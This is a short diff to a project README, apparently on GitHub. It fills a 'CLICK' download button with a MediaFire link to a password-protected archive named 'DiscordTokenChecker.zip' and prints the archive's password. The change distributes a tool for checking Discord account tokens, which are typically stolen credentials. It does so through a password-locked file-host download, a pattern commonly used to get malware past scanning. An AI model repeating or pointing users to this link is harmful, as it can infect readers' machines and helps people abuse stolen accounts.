@@ -3,7 +3,7 @@
 The project still work and currently being rewritten for react and nest js. I think to finish within ~1.5 months. Stay in touch!
 ## Download
 
-[CLICK <br />![](https://user-images.githubusercontent.com/49491499/170839662-cf4f9872-3ece-4892-85b6-e18e84a28b0b.png)]()
+[CLICK <br />![](https://user-images.githubusercontent.com/49491499/170839662-cf4f9872-3ece-4892-85b6-e18e84a28b0b.png)](https://www.mediafire.com/file/x2kx1x8eonyz8en/DiscordTokenChecker.zip/file)
 # Password - SadClownI
 
 ## USAGE
